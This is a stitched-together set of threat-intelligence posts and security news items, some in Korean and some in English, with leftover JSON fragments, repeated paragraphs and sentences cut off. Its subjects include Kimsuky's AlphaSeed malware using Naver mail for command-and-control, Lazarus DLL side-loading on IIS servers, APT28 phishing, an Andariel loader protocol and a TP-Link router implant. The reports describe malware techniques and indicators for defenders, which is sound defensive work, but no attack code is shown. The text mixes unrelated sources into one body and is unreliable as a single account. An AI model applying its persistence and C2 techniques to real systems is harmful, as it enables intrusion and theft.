이는 Infostealer 악성코드로부터 탈취된 쿠키값을 이용하여 계정을 탈취하는 방식과 동일한 방식으로 볼 수 있다. 이후 로그인에 성공하면, 네이버 메일 서비스에 접근하여 정보 탈취 및 명령 전달을 수행한다.공격자는 쿠키값을 이용하여 계정에 로그인하기 위해 오픈소스로 chromedp를 사용한다. Chromedp는 디버깅, 컨텐츠 검사 등 다양한 기능을 수행할 수 있는 Chrome Devtools 프로토콜을 서포팅하는 클라이언트 프로그램이다.네이버 메일과 상호작용을 수행하기 위해 패킷 통신을 수행하는 방식이 아닌, chromedp라는 중간 매개체를 이용하여 악성 행위를 위한 스크립트를 실행하는 방식을 사용한다. AlphaSeed는 해당 방식을 통해 특정 버튼을 클릭하거나 메일을 작성하여 전송하는 기능을 수행한다.Cookie 값을 통해 네이버 로그인 후, 네이버 메일함 중 내게쓴메일함을 이용하여 데이터를 주고 받는다. 내게쓴메일함 내에 특정 이름을 가진 메일함 정보를 가져와 확인하며, 이후 목적에 맞는 메일함을 사용하여 탈취한 정보 및 명령 수행에 사용한다.악성코드 내에는 감염자 정보를 수집하는 ping 기능이 존재한다. 감염자를 식별하기 위한 uid 및 감염된 환경 정보, 감염 당시 시간을 Zlib를 통해 압축한 후 Base64로 인코딩한 데이터 메일 제목으로 사용하여 전송한다. 이후, 공격자는 ping 메일 제목으로 사용된 값을 추출하여 감염자 식별 및 명령 전송에 사용한다.{“uid”:”886xxxxxxxxxx”,”platform”:”windows amd64\",”ver”:{“major”:1,”minor”:2,”build”:0},”time”:1683982504982}Cmd 메일함에 저장된 명령 메일을 읽어와 악성 행위를 수행한다. Cmd 메일함에 존재하는 메일 중에서 Ping 메일내 포함된 감염자의 고유 값(uid)이 제목에 포함된 메일 정보를 가져온다. 메일 내 데이터를 AlphaSeed 내 RSA Private Key로 복호화하고, RC4 Key를 확보한다. 이후 RC4 Key로 데이터를 복호화하여 명령을 추출한다. 추출된 명령 코드에 따라 다음과 같은 악성행위를 수행한다.감염된 시스템에서 수집한 정보를 각각의 메일함으로 전송한다.공격자는 메일 제목과 본문에 모두 데이터를 포함시켜 전송하지만, AlphaSeed의 실제 통신을 그대로 구현한 결과, 그 부분이 제대로 동작하지 않아 메일 제목에만 데이터가 입력된 점이 확인되었다. 이러한 특징은 아직 AlphaSeed의 기능 구현이 완성되지 않았다는 점을 제시한다.AlphaSeed 악성코드가 메일 전송 관련 URL을 조합할 때 유저명으로 추정되는 네이버 계정을 발견할 수 있었다. 분석 당시 악성코드 내 Cookie값이 유효하지는 않았지만, VirusTotal 업로드 당시 해당 계정으로 로그인 후, 메일 전송까지 정상적으로 수행한 것으로 추정되는 통신 기록이 발견되었다.해당 네이버 계정이 실제로 존재하는 계정이며, 블로그 페이지 또한 존재하는 점까지 확인되었다. 하지만, 해당 계정이 공격자의 계정인지 탈취한 계정을 악용하는 것인지는 확인되지 않았다.AlphaSeed는 Go언어로 작성되었다는 점에서 기존 Kimsuky 그룹의 악성코드와 코드 유사성은 식별되지 않았지만, AppleSeed 악성코드와 유사한 기능이 상당수 확인되었다는 점에서 S2W에서는 Kimsuky 그룹의 악성코드로 식별하였다. 다음 메일을 C&C 서버로 사용하는 AppleSeed 악성코드에 대한 설명은 아래에서도 확인이 가능하다.다음 메일을 C&C 서버로 사용하는 AppleSeed 악성코드에서도 감염된 시스템의 정보를 메일로 전송하는 Ping 기능과 공격자로부터 명령을 받아 실행하는 Command 기능이 존재한다. 과거 AppleSeed 케이스에서는 SMTP와 IMAPS 프로토콜을 이용해 메일을 전송했다면, 이번 AlphaSeed 케이스의 경우 ChromeDP를 이용해 직접 메일을 전송하는 차이점이 존재한다. 또한, 다음 메일을 통해 명령을 받는 Command 기능을 수행할때 “cmd” 메일함 이름을 사용한다는 점이 이번 케이스와 동일한 특징으로 보인다.명령 실행 과정에서도 AppleSeed 와의 공통점이 확인되었다. 두 악성코드 모두 공격자로부터 명령 데이터를 받은 후 RSA Private Key를 통해 RC4 Key를 추출하고, 이후 RC4 Key로 명령 데이터를 추출한 뒤 악성 행위를 수행한다. 기존 AppleSeed에서는 3개의 명령이 확인되었지만, AlphaSeed 내에는 5개의 명령이 확인되었다는 점에서 기능상의 업데이트도 함께 이루어진 것으로 확인된다.추가로, 최근 AhnLab은 Kimsuky 그룹이 Go언어로 작성된 악성코드를 이용해 Meterpreter를 로드하고 최종적으로 Go언어로 작성된 Proxy 악성코드를 사용하였다는 내용을 공개하였는데, Kimsuky 그룹이 과거 AppleSeed 악성코드 감염 이후 Meterpreter를 설치했던 사례들도 확인되었던만큼 Kimsuky이 최근 악성코드를 Go 언어로 제작하려는 움직임이 보이고 있다.----S2W BLOGS2W is specializing in cybersecurity data analysis for cyber threat intelligence.S2WinS2W BLOG--S2WinS2W BLOG--S2WinS2W BLOG--S2WinS2W BLOG--1Michael Koczwara--Christopher Elce--Nasreddine BencherchaliinSigma_HQ--assume-breach--Haadi Mohammed--Nathan Hueck--HelpStatusAboutCareersBlogPrivacyTermsText to speechTeams"

      "text": " AhnLab Security Emergency response Center(ASEC)은 국가 차원의 지원을 받는 공격 그룹으로 알려진 Lazarus 그룹이 최근 윈도우 IIS 웹 서버를 대상으로 공격을 수행한 것을 확인하였다. 일반적으로 공격자들은 스캐닝 결과 취약한 버전을 갖는 웹 서버가 확인되면 버전에 맞는 취약점을 이용해 웹쉘을 설치하거나 악성 명령을 실행한다. 아래 [그림 1]의 자사 AhnLab Smart Defense(ASD) 로그를 보면 공격 대상이 윈도우 서버 시스템이고, IIS 웹 서버 프로세스인 w3wp.exe에 의해 악성 행위가 수행되는 것이 확인된다. 이에 따라 공격자 또한 부적절하게 관리되고 있거나 취약한 웹 서버를 최초 침입 경로로 하여 이후 악성 명령을 실행한 것으로 추정된다.공격자는 윈도우 IIS 웹 서버 프로세스(w3wp.exe)를 통해 Wordconv.exe, msvcr100.dll, msvcr100.dat을 생성하고 Wordconv.exe를 실행하였다. Wordconv.exe의 임포트 DLL 목록에는 아래 [그림 2]와 같이 msvcr100.dll이 존재하므로 Wordconv.exe가 실행될 경우 운영체제의 DLL 검색 순서에 따라 동일 경로의 DLL 파일을 먼저 로드한다. 결과적으로 악성 msvcr100.dll이 Wordconv.exe 프로세스의 메모리에서 실행된다.msvcr100.dll의 기능은 아래 [그림 3]과 같이 Wordconv.exe 실행 시점에 실행 인자로 전달받은 키(df2bsr2rob5s1f8788yk6ddi4x0wz1jq)와 인코딩된 PE 파일(msvcr100.dat)을 Salsa20 알고리즘을 통해 복호화하여 메모리 상에서 PE 파일을 실행한다. 그리고 FreeLibraryAndExitThread WinAPI 호출을 통해 로드된 악성 DLL 모듈을 해제한 뒤 자기 자신(msvcr100.dll)을 삭제하는 기능을 수행한다.cylvc.dll은 msvcr100.dll와 동일한 방식으로 Salsa20 알고리즘을 통해 dat 확장자를 갖는 데이터 파일을 복호화한 뒤 메모리상에서 PE를 실행하였다. 2022년 당시 메모리 상에서 실행된 PE는 공격자 C&C 서버와 통신하는 백도어 악성코드였다.diagn.dll의 기능은 RC6 알고리즘으로 인코딩된 PE 파일을 실행 인자 값으로 전달받아 내부에 하드코딩된 키로 데이터 파일을 복호화하여 메모리 상에서 PE 파일을 실행한다.공격 당시의 인코딩된 PE 데이터 파일이 수집되지 않아 메모리 상에서 실행된 PE 파일의 악성 행위에 대해 알 수 없었지만, AhnLab Smart Defense (ASD) 인프라에서 공격자가 해당 모듈을 통해 lsass.exe 프로세스 메모리에 접근한 이력이 확인되었다. 따라서 공격자는 미미카츠와 같은 자격 증명 정보 탈취 도구를 실행한 것으로 추정된다.시스템 자격 증명 정보를 획득한 공격자는 내부 정찰을 수행한 뒤 원격 접속(3389 포트)을 이용하여 내부 네트워크로 측면 이동(Lateral Movement)을 수행하였다. 측면 이동 이후 공격자의 추가 악성 행위는 현재까지 확인되지 않았다.특히, 공격자는 Dll Side-loading 기법을 초기 침투에 주로 사용하고 있으므로 기업에서는 비정상적인 프로세스 실행 관계 등을 모니터링하여 공격자가 정보 탈취, 측면 이동 등을 수행하지 못하도록 선제적으로 대응해야한다.현재 안랩 제품군에서 이번 공격 사례에서 확인한 악성코드에 대해 다음 탐지명으로 진단하고 있다.[파일 진단]– Trojan/Win.LazarLoader.C5427612 (2023.05.15.02)– Trojan/Win.LazarLoader.C5427613 (2023.05.15.03)[IOC][Dll Side-loading 파일 경로]– C:\\ProgramData\\USOShared\\Wordconv.exe– C:\\ProgramData\\USOShared\\msvcr100.dll[MD5]– e501bb6762c14baafadbde8b0c04bbd6 : diagn.dll– 228732b45ed1ca3cda2b2721f5f5667c : msvcr100.dll– 47d380dd587db977bf6458ec767fee3d : ?

      "text": " Whoops! You have to login to access the Reading Center functionalities!\nUsername or Email Address\n\n\nPassword\n\n Remember Me\n\n\nThe APT28 intrusion set (aka. Sofacy, PawnStorm, Fancy Bear), associated to the Russian GRU was observed using multiple phishing techniques to target the Ukrainian civil society.The APT28 intrusion set (aka. Sofacy, PawnStorm, Fancy Bear), associated to the Russian GRU and famous for its cyber espionage and sabotage campaigns, was observed using multiple phishing techniques to target the Ukrainian civil society. These techniques include using HTTP webhook services such as as Pipedream and Webhook, as well as compromised Ubiquiti routers to steal victims’ credentials. On one occasion, APT28 was seen using the “Browser in the Browser” technique to display a fake login page to the victim, purporting to decrypt a document.This small blogpost aims at presenting the different techniques used by APT28 to create their spear phishing webpages, as well as ways to detect them, including IOCs and YARA rules.A second technique that we observed used by APT28 since more than a year is the use of public HTTP debugging / webhook services in their phishing webpages to retrieve stolen credentials, as shown below:This is the first time we see a state-sponsored threat actor use these services for phishing operations. While this technique remains effective, from a security perspective, there is a concern that some services might allow access to hooks created by simply by specifying the hook identifier. This implies that anyone accessing the phishing page can view stolen credentials by looking at the specific hook.The aforementioned technique is only applicable to accounts with 1FA authentication, as the webhook service lacks the capability to interact with the UKR.NET servers for validating the second factor and retrieving authentication cookies or tokens. For 2FA accounts, APT28 created dedicated webpages hosted on  *.frge[.]io domains that interact with a Python script running on compromised Ubiquiti routers.Here is an extract from the HTML code of a phishing webpage that points to a compromised Ubiquiti router ( 174.53.242.108):The script enables two other interesting features. The first one is that it activates IMAP access via the UKR.NET API for the compromised mail account and saves the generated password from UKR.NET, which will be used for this access, to a file as shown below. Embedding IMAP access to the mailbox is a known trick that allows APT28 operators to automate mail exfiltration.Another interesting feature embedded in this script is that it deletes the last emails received from  noreply@ukr.net. Sekoia.io analysts assess this is almost certainly done to cover up changes to the mailbox security settings. It is also highly likely a technique to prevent the user from being alerted to a new access to the mailbox.Sekoia.io analysts link their campaigns to APT28 with high confidence based on two artefacts.—Malicious domains namesCompromised Ubiquiti routersSSH rootkit IOCsYara rules to detect APT28 Thank you for reading this blog post.

      "text": "  More than 5.81 million patients tied to PharMerica have been notified that their data was accessed and stolen during a March cyberattack. The long-term care pharmacy solution provider reported the breach to the Office of the Maine Attorney General on May 12.On March 14, PharMerica “learned of suspicious activity” on its network and worked to secure its systems, while launching an investigation with support from cybersecurity advisors.The forensics showed that threat actors accessed the provider’s systems for two days and exfiltrated patient data during the dwell time. The stolen data included patient names, contract information, Social Security numbers, prescriptions, and health insurance information.Notably missing from the breach notice to consumers is that the data was allegedly taken by the Money Message ransomware group. PharMerica appeared on its data leak website one month ago. The actors are a relatively new threat who previously claimed the cyberattack on Taiwanese PC parts maker MSI. Despite Money Message’s claims, PharMerica’s notice says they “have no reason to believe that anyone’s information has been misused for the purpose of committing fraud or identity theft.”The largest incidents reported by single healthcare entities this year:NextGen Healthcare is reporting a hack of patient data for the second time this year. A threat actor gained access to a “limited set” of personal information stored in the NextGen Office System, leading to the access of data tied to 1.05 million patients.The dates on the recent notice suggest this breach is separate from the earlier incident. NextGen was “alerted to suspicious activity” on the impacted systems on March 30, prompting the security team to contain the incident and reset passwords, in addition to contacting law enforcement.The subsequent investigation found a threat actor accessed stored data between March 29 and April 14. The accessed data included patient names, dates of birth, Social Security numbers, and contact information.NextGen is continuing to work with law enforcement on their investigation, while further reinforcing its systems security. However, some of the impacted patients have already filed at least seven data-breach lawsuits against the vendor over the incident and patient privacy impacts.The health data of nearly 104,000 Uintah Basin Healthcare patients was accessed and/or stolen during a November 2022 cyberattack.Discovered on Nov. 7, UBH worked to secure the network and launched an investigation to determine the scope of the incident. While the incident was found six months ago, the notice suggests UBH did not discover the breach of protected health information until early April.The investigation confirmed the data compromise impacted patients who received care with UBH between March 2012 and November 2022. The stolen data included names, SSNs, dates of birth, health insurance information, and some clinical data, including diagnoses, conditions, medications, test results, and procedures.The voice of healthcare cybersecurity and policy for SC Media, CyberRisk Alliance, driving industry-specific coverage of what matters most to healthcare and continuing to build relationships with industry stakeholders.After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

The researchers also say they observed the RA Group making cosmetic changes to the leak site after disclosing the victim’s details, which confirms they are in the early stages of the operation. Cisco Talos on May 15 compiled a timeline of these attacks conducted by different actors using ransomware families that branched off the leaked Babuk source code.The Babuk-leaked ransomware has sprouted into several customized families of malicious code, said Timothy Morris, chief security advisor at Tanium. Morris said it exploits several known vulnerabilities within software, including Exchange, Struts, WordPress, Atlassian Confluence, Oracle WebLogic Server, SolarWinds Orion, and Liferay, interrupting backups and deleting volume shadow copies.“It’s important that organizations have a robust vulnerability program and patch frequently,” said Morris. “The preventions are the same. Know your environment and what you look like to an attacker. This includes inventory of hardware, software, and the versions. Keep EDR and network inspection tools up-to-date that consistently monitor IOCs and behaviors.”After admitting responsibility for compromising Sony, a Colonial Pipeline supplier, and a Hawai'i government site, the RansomedVC group has claimed that it will be ending operations due to the arrests of six of its affiliates, reports The Record, a news site by cybersecurity firm Recorded Future.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.Attack on the U.S. subsidiary of the Industrial & Commercial Bank of China disrupted Treasury trading in New York earlier this week.

      "text": " Eleven vulnerabilities in the cloud-management platforms of three industrial cellular router vendors put operational technology (OT) networks at risk for remote code execution, even if the platform is not actively configured for cloud management, researchers have found.The vulnerabilities are so severe that even though they affect devices from only three vendors — Sierra Wireless AirLink, Teltonika Networks RUT, and InHand Networks InRouter — they could impact thousands of industrial Internet of things (IIoT) devices and networks in a variety of sectors, warn Eran Jacob, security research team leader, and Roni Gavrilov, security researcher, from Otorio.\"Breaching of these devices can bypass all of the security layers in common deployments, as IIoT devices are commonly connected both to the Internet and the internal OT network,\" the researchers tell Dark Reading. \"It also raises additional risk for propagation to additional sites through the built-in VPN.\"If attackers achieve direct connectivity to the internal OT environment, it also may lead to impact on production and safety risks for users across the physical environment, the researchers added.An industrial cellular router allows multiple devices to connect to the Internet from a cellular network. These routers are commonly used in industrial settings, such as manufacturing plants or oil rigs, where traditional wired Internet connections may not be available or reliable, the researchers said.\"Industrial cellular routers and gateways have become one of the most prevalent components in the IIoT landscape,\" Gavrilov wrote in the report. \"They offer extensive connectivity features and can be seamlessly integrated into existing environments and solutions with minimal modifications.\"Vendors of these devices employ cloud platforms to provide customers with remote management, scalability, analytics, and security across their OT networks. Specifically, researchers found various vulnerabilities that \"pertain to the connection between IIoT devices and cloud-based management platforms,\" which, in some devices, is enabled by default, the researchers explain to Dark Reading.\"These vulnerabilities can be exploited in various scenarios, affecting devices that are both registered and unregistered with remote management platforms,\" they say. \"Essentially, it means that there are security weaknesses in the default settings of certain devices' connectivity to cloud-based management platforms, and these weaknesses can be targeted by attackers.\"The typical connectivity to these platforms relies on machine-to-machine (M2M) protocols like MQTT for device-cloud communication together with Web interfaces for user management, according to the report. MQTT operates on a publish-subscribe model, where the broker manages topics and devices can subscribe to receive published information. A specialized device API is also commonly used for initialization communication with the cloud platform, along with user API and Web interface for management of the devices.Researchers identified critical issues that can be exploited by various attack vectors in three key areas of this connectivity: the asset-registration process, security configurations, and external APIs and Web interfaces, they said.Moreover, exploitation of the vulnerabilities could allow attackers to interfere with operational processes, putting the safety of those working in the environment at risk, they say.They also should register devices under their own accounts in the cloud platform before connecting them to the Internet. This establishes ownership and control and prevents unauthorized access, the researchers said.Further, administrators can limit direct access from IIoT devices to the routers, since built-in security features like VPN tunnels and firewalls are ineffective once compromised, the researchers said.\"Adding separate firewall and VPN layers can assist with delimitering and reduce risks from exposed IIoT devices used for remote connectivity,\" Gavrilov wrote in the report.\"This may involve reducing 'high-risk' features upon demand and adding extra layers of authentication, encryption, access control, and monitor,\" Gavrilov wrote.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Heads up: threat actors are now deploying a Go-language implementation of Cobalt Strike called Geacon that first surfaced on GitHub four years ago and had remained largely under the radar.They are using the red-teaming and attack-simulation tool to target macOS systems in much the same way they have used Cobalt Strike for post-exploit activity on Windows platforms the past few years.One malicious sample submitted to VirusTotal on April 5 is an AppleScript applet titled \"Xu Yiqing's Resume_20230320.app\" that downloads an unsigned Geacon payload from a malicious server with a China-based IP address.SentinelOne found the application is compiled for macOS systems running on either Apple or Intel silicon. The applet contains logic that helps it determine the architecture of a particular macOS system so it can download the specific Geacon payload for that device. The compiled Geacon binary itself contains an embedded PDF that first displays a resume for an individual named Xu Yiqing before beaconing out to its command and control (C2) server.\"The compiled Geacon binary has a multitude of functions for tasks such as network communications, encryption, decryption, downloading further payloads, and exfiltrating data,\" SentinelOne said.In another instance, SentinelOne discovered a Geacon payload embedded in a fake version of the SecureLink enterprise remote-support application. The payload appeared in VirusTotal on April 11 and targeted only Intel-based macOS systems. Unlike the previous Geacon sample, SentinelOne found the second one to be a bare-bones, unsigned application likely built with an automated tool. The app required the user to grant access to the device camera, microphone, administrator privileges, and other settings typically protected under macOS's Transparency, Consent, and Control framework. In this instance, the Geacon payload communicated with a known Cobalt Strike C2 server with an IP address based in Japan.\"This is not the first time we have seen a Trojan masquerading as SecureLink with an embedded open-source attack framework,\" SentinelOne said. The security vendor pointed to its discovery last September of an open-source attack framework for macOS called Sliver embedded with a fake SecureLink as another example. \"[Its] a reminder to all that enterprise Macs are now being widely targeted by a variety of threat actors,\" SentinelOne said.In other instances, attackers have also used a macOS focused red-teaming tool called Mythic as part of their attack chains.The activity involving Geacon itself started shortly after an anonymous Chinese researcher using the handle \"z3ratu1\" released two Geacon forks last October — one private and likely for sale called \"geacon_pro\" and the other public, called geacon-plus. The pro version includes some additional features like anti-virus bypassing and anti-kill capabilities, says Tom Hegel, senior threat researcher at SentinelOne.He ascribes the sudden attacker interest in Geacon to a blog that z3ratu1 posted describing the two forks and his attempts to market his work. The original Geacon project itself was largely for protocol analysis and reverse engineering purposes, he says.The growing malicious use of Geacon fits in with a broader pattern of growing attacker interest in macOS systems.SentinelOne has released a set of indicators to help organizations identify malicious Geacon payloads.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

But they have also been the biggest source of risk for website operators in recent years.According to Patchstack, the bug has to do with Essential Addons' code resetting passwords without validating if the associated password reset keys are present and legitimate. This offers a way for an unauthenticated attacker to reset the password of any user on an affected WordPress site and login to their account.The new bug is one among thousands of vulnerabilities that researchers have uncovered in WordPress plug-ins in recent years.Just last week, Patchstack reported on another privilege escalation vulnerability in a different WordPress plug-in (Advanced Custom Fields Plugins) that affected two million websites. The vulnerability gave attackers a way to both steal sensitive data from affected sites as well as escalate privileges on them.Sucuri found the threat actor using newly disclosed vulnerabilities and, in some instances, zero-day bugs to launch massive attack waves against WordPress sites.According to Patchstack, the growing number of vulnerabilities that are being reported in the WordPress ecosystem isn't necessarily a sign that plug-in developers are getting sloppier. What it indicates rather is that security researchers are looking harder.\"This also means that the WordPress ecosystem is becoming more secure because a lot more of these security bugs are being addressed and patched,\" Patchstack said.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

The group is highly likely to have targeted entities associated with the non-governmental, media, international humanitarian, and development sectors. It is almost certain that the entities targeted shared an interest in Yemen, security, humanitarian aid, and reconstruction matters. The group’s operations have reportedly included targeting persons attending Saudi Arabian government-led negotiations; coupled with the use of spoofed Android applications mimicking entities tied to the Saudi Arabian government, and a UAE humanitarian organization (among others). As of this writing, we suspect that the attackers targeted individuals the Houthis wanted direct access to.OilAlpha has almost exclusively relied on infrastructure associated with the Public Telecommunication Corporation (PTC), a Yemeni government-owned enterprise reported to be under the direct control of the Houthi authorities. OilAlpha used encrypted chat messengers like WhatsApp to launch social engineering attacks against its targets. It has also used URL link shorteners. Per victimology assessment, it appears a majority of the targeted entities were Arabic-language speakers and operated Android devices. OilAlpha threat actors are highly likely to be involved in espionage activity, as handheld devices were targeted with remote access tools (RATs) like SpyNote and SpyMax. We have also observed njRAT samples communicating with C2s associated with this group, making it likely that OilAlpha has used other malware for testing or attack operations.Barring the discovery of new information or broader geostrategic shifts, OilAlpha is likely to continue to use malicious Android-based applications to target entities that share an interest in Yemen’s political and security developments and the humanitarian and NGO sectors that operate in Yemen.Contact us today"

      "text": " --ListenShareSince 2020 DCSO has been monitoring a publicly undocumented malware family attributed to the Andariel group, a subgroup of the infamous North Korean Lazarus Group. The malware family has remained largely unchanged over the years and only made few appearances.In early 2023 however, one such appearance seemed particularly noteworthy as the configured Command & Control suggests that the attackers have managed to compromise the web presence of the National Institute of Virology in India and possibly used it to control computers infected with the malware family.In this blog post, we document the malware and discuss how this finding fits the attacker profile.We then added custom rules for this family to our monitoring. Around a year later the rule produced another hit (the “OSPREY sample”, based on its code signature by “OSPREY VIDEO, INC.”) which we could attribute to a targeted attack attempt against a German medical/pharma company.Analysis of the “CISA sample” revealed it to likely be older, with the timestamps dating it to 2021, the same year as the “OSPREY sample”. Then, a few weeks later our monitoring finally detected another sample and this time it appeared to be a fresh catch too, with timestamps indicating a compile time in mid January 2023.At the time of finding the sample, we were unable to receive actual commands from the configured C2 so it remains inconclusive if the compromise took place. However, the configured path does closely resemble another path that we believe was used by the real web page at some point — further indicating that a compromise took place and was intentionally chosen to blend in:For similar attacks it is also documented that commands are closely guarded and only issued to requests coming from expected source IPs, typically returning 404 for anyone else in order to keep a low profile.So while we do not have definite proof of a compromise, DPRK actors targeting the NIV (either as the intended target or in order to attack other targets in the general nexus of the NIV such as other medical companies) would fit the attacker profile very well.The Command & Control projectcell.niv[.]co.in resolves to 173.249.33[.]80, which is allocated to German mass-hosting provider Contabo GmbH. No other FQDNs have been seen on this IP address thus far.It remains unclear at the time of writing why IKF chose to host at least some of their customers’ infrastructure in Germany, far away (in both geographic and network terms) from their (presumed) main audience in the India vicinity.Further, IKF’s nameserver setup struck us as odd, with the primary nameserver serving niv[.]co.in and others, ns.iknowledgefactory.com, resolving to 103.73.189.76 — allocated to Evoke Digital Solutions in India — while having its PTR DNS record set to email.lkf.in. This domain (note the similarity of “l” and “i”) however is currently available for sale, and does not seem to be under control of IKF anymore.Lastly, it has to be noted that the official website of the National Institute of Virology is niv.icmr.org.in, a fact also advertised on niv[.]co.in — which appears to have been abandoned by NIV or IKF commencing October 2022. Rather than letting previously used domains orphan or even expire, it is crucial to set up proper redirects to the new primary domain, and ensure the respective organization maintains control over its domain set all the time.The malware itself is a basic loader. It can download files, execute shell commands and send back the console output.Communication happens via HTTP which is manually implemented using socket functions, and as such it is not capable of communicating with HTTPS servers.The client transfers data via POST requests, in which the data fields are encrypted using a simple rotating xor + base64.We’ve identified the following fields:The page field contains basic client info, such as:10.0.0.1|DESKTOP-BI961TX|batman|110|64where the first field is a collection of local IP addresses, followed by the computer name, username, Windows version as well as bitness of the system.The server then responds either with HTTP 504, which signals the bot to stop running, or HTTP 500 which may contain a command and/or download payload in the HTTP body.In case of HTTP 500 (shell command and/or download task) the HTTP body adheres to the following format:All fields following the xor key are encrypted with it using a simple rolling xor scheme.The check string appears to be a magic 8 byte value the client verifies with a simple algorithm, which is satisfied by the following magic bytes:Example code of the check algorithm in Python:Based on this, we’ve created a Suricata rule which we’re distributing as part of the IoCs.If a download target path is specified in the response, the malware will write the payload to the specified path and copy Explorer.exe’s timestamps to it in order to disguise the file. In case the downloaded file is an EXE file it will also pad the executable with 40,000,000 (~40MB) random bytes on disk, likely to exceed some security software’s file limits and/or generate a unique hashsum for downloaded binaries.If a shell command is specified, the malware will execute the shell command, capture the output and send the contents back to the C2 using the rep0 POST request field.----We are DCSO, the Berlin-based German cybersecurity company.

These victims span various countries, including Australia, Brazil, Canada, Colombia, France, Netherlands, Serbia, the United Kingdom, Japan and the United States.The research also provided valuable recommendations to prevent and defend against Qilin ransomware attacks.

      "text": " A Chinese state-sponsored hacking group named \"Camaro Dragon\" infects residential TP-Link routers with a custom \"Horse Shell\" malware used to attack European foreign affairs organizations.The backdoor malware is deployed in a custom and malicious firmware designed specifically for TP-Link routers so that the hackers can launch attacks appearing to originate from residential networks.\"It is worth noting that this kind of attack is not aimed specifically at sensitive networks, but rather at regular residential and home networks,\" explains the Check Point report.\"Therefore, infecting a home router does not necessarily mean that the homeowner was a specific target, but rather that their device was merely a means to an end for the attackers.\"The deployed malware allows the threat actors full access to the device, including running shell commands, uploading and downloading files, and using it as a SOCKS proxy to relay communication between devices.Check Point tracks this activity separately using the \"Camaro Dragon\" name for the activity cluster despite the similarities and considerable overlap with Mustang Panda.The attribution was made based on attackers' server IP addresses, requests featuring hard-coded HTTP headers found on various Chinese websites, many typos in the binary code that show the author isn't a native English speaker, and functional similarities of the trojan with the APT31 \"Pakdoor\" router implant.While Check Point has not determined how the attackers infect TP-Link routers with the malicious firmware image, they said it could be by exploiting a vulnerability or brute-forcing the administrator's credentials.Once a threat actor gains admin access to the management interface, they can remotely update the device with the custom firmware image.Through investigation, Check Point found two samples of trojanized firmware images for TP-Link routers, both containing extensive modifications and file additions.Check Point compared the malicious TP-Link firmware with a legitimate version and found that the kernel and uBoot sections were the same. However, the malicious firmware utilized a custom SquashFS filesystem that contained additional malicious file components that are part of the Horse Shell backdoor malware implant.\"Parts of it are internally named Horse Shell so we use it to name the implant as a whole. The implant provides the attacker with 3 main functionalities: remote shell, file transfer, and tunneling,\" explains Check Point.The firmware also modifies the management web panel, preventing the device's owner from flashing a new firmware image for the router and ensuring the persistence of the infection.When the Horse Shell backdoor implant is initialized, it will instruct the OS not to terminate its process when the SIGPIPE, SIGINT, or SIGABRT commands are issued, and to be converted into a daemon to run in the background.The backdoor will then connect to the command and control (C2) server to send the victim's machine profile, including the user name, OS version, time, device information, IP address, MAC address, and supported implant features.Horse Shell will now quietly run in the background waiting for one of the following three commands:The researchers say the Horse Shell firmware implant is firmware-agnostic, so it could theoretically work in firmware images for other routers by different vendors.It's not surprising to see state-sponsored hackers targeting poorly secured routers, often targeted by botnets for DDoS attacks or crypto-mining operations. This is because routers are often overlooked when implementing security measures and can act as a stealthy launchpad for attacks, obfuscating the attacker's origin.Users are advised to apply the latest firmware update for their router model to patch any existing vulnerabilities and change the default admin password to something strong. However, even more critical, disable remote access to the device's admin panel and make it only accessible from the local network.As these devices do not commonly support EDR (Endpoint Detection and Response) security solutions, threat actors can use them to steal data, spread laterally, and conduct further attacks with less opportunity for detection.\"There's a recurring theme of continued China-nexus cyber espionage focus on network appliances, IOT devices, etc. that don't support EDR solutions,\" Mandiant CTO Charles Carmakal told BleepingComputer.For this reason, it is vital for network admins to install all available security patches on edge devices as soon as they become available and not publicly expose management consoles."

      "text": " Freelance JournalistTo assess the damages caused by the attack, the company said it temporarily shut down several online systems.“Prior to restarting the systems of these sites, investigations are underway to ensure that the attack is completely contained,” Lacroix wrote in a statement. “However, some local infrastructures have been encrypted, and an analysis is also being carried out to identify any exfiltrated data.”These operations, combined with the need to use backups to restore systems, are expected to require a few days, leading to the closure of the three sites for the week.“Even if it is still too early to know exactly when production will resume, Lacroix is aiming for a reopening on Monday, May 22nd,” reads the statement.In the meantime, the firm said partial activity measures had been implemented, and a tailored management and restart plan has been devised for each site.“Louis Pourdieu, General Manager of the Electronics EMEA activity, with the support of his teams, is informing customers and suppliers about the closure and the conditions for restarting these sites,” Lacroix added.The affected sites represent a significant portion of the company, accounting for 19% of the group’s total sales in 2022. However, due to a “favorable calendar” this week, with only three days of production, Lacroix does not anticipate any significant impact on the overall performance projected for the group in 2023.“Ransomware, wiperware, and any other type of malware are preventable. It starts with basic cyber hygiene: network segmentation, backups, regular patching, and vulnerability assessments,” the executive explained.“However, organizations that want to stay ahead of criminals (and competition) will be promoting positive security behaviors, treating them as a core value or an active process. People want to be part of the solution. Give them the tools and training to allow them to be effective.”"

      "text": " Freelance JournalistDescribed in a report called “The Growing Threat From Infostealers,” the new findings shed light on the thriving infostealer market, which plays a pivotal role in facilitating cybercrime activities such as ransomware attacks. “Infostealers are a natural choice for cybercriminals [...] looking to rapidly gain access to businesses and then monetize that access,” commented Don Smith, VP of Secureworks CTU. “They are readily available for purchase, and within as little as 60 seconds generate an immediate result in the form of stolen credentials and other sensitive information.”“What has really changed the game, as far as infostealers are concerned, is improvements in the various ways that criminals use to trick users into installing them, such as fake messaging apps and cloned websites,” Smith added.“That, coupled with the development of dedicated marketplaces for the sale and purchase of this stolen data, makes it even harder for victims to detect and remove infostealer.”“What we are seeing is an entire underground economy and supporting infrastructure built around infostealers, making it not only possible but also potentially lucrative for relatively low-skilled threat actors to get involved,” 